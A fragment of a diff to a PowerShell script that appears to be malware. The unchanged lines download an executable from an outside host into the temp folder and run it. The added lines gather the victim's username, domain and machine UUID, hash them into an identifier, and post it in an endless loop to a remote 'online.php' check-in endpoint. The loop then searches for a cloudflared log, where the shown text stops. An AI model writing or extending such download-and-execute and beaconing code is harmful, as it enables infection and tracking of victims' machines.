@@ -41,9 +41,20 @@ $url = "http://zwalx5oi.x10.mx/lo/sechgay.exe"
 $outfile = "$env:TEMP\sechgay.exe"
 Invoke-WebRequest -Uri $url -OutFile $outfile
 Start-Process $outfile
+$username  = $env:USERNAME
+$userdomain = $env:USERDOMAIN
+$machineid = (Get-WmiObject Win32_ComputerSystemProduct).UUIDt
+$raw = "$username|$userdomain|$machineid"
+$md5 = [System.BitConverter]::ToString(
+    (New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider).ComputeHash(
+        [System.Text.Encoding]::UTF8.GetBytes($raw)
+    )
+).Replace("-", "").ToLower()
+
 
 
 while ($true) {
+    Invoke-RestMethod -Uri "http://simpleappchat.elementfx.com/online.php" -Method POST -Body @{ id=$md5 }
     $logFile = Get-ChildItem -Path "D:\A" -Recurse -Filter "cloudflared.log" | Select-Object -First 1
     if ($logFile) {
         $content = Get-Content -Path $logFile.FullName -Raw
